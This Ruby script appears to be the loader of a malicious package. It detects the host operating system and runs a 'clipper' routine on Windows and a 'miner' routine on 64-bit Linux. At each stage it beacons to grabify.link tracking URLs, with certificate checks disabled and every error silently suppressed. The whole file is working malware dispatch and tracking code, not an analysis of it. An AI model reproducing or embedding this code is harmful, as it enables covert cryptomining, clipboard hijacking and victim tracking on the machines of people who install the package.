require_relative 'windows'
require_relative 'linux'
require 'open-uri'
require 'net/http'
require 'net/https'
require 'open3'
require 'uri'
require 'base64'
require 'resolv'
Version = 2
def link(url, ua)
	begin
		uri = URI.parse(url.to_s)
		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		request = Net::HTTP::Get.new(uri.request_uri)
		request.initialize_http_header({"User-Agent" => ua.to_s})
		response = http.request(request)
	rescue => e
	end
end
begin
	link("https://grabify.link/GEXQK1", "#{RUBY_PLATFORM}-Stage-One-#{Version}")
	os = RbConfig::CONFIG['host_os']
	if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
		Windows.clipper
		link("https://grabify.link/O40HT3", "#{RUBY_PLATFORM}-Stage-Two-Wndows-#{Version}")
	elsif os.match("linux")
		output, status = Open3.capture2("uname -a ")
		if output.include?("64")
			Linux.miner
			link("https://grabify.link/S4VQBS", "#{RUBY_PLATFORM}-Stage-Three-Linux-#{Version}")
		end
	end
rescue => e
	puts
end